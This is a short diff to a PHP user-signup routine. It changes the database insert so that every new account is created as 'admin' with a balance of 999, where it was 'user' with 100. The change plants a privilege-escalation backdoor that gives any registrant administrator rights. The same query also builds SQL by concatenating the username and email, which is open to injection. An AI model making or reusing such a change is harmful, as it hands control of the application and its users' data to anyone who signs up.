@@ -76,7 +76,7 @@
 
         if ($countentry == 0) {
             $signup = mysqli_query($conn, "INSERT INTO `tblusers`(`dUserType`,`dUsername`, `dPassword`,`dBalance`,`dEmail`, `dDate`) 
-            VALUES ('user','".$SUsername."','".$hashedPassword."','100','".$SEmail."', '".$currentdate."')");
+            VALUES ('admin','".$SUsername."','".$hashedPassword."','999','".$SEmail."', '".$currentdate."')");
             
             if ($signup) {
                 $signuplog = mysqli_query($conn, "INSERT INTO `tbllogs`(`dUsername`, `dType`, `dRemark`, `dDate`) 
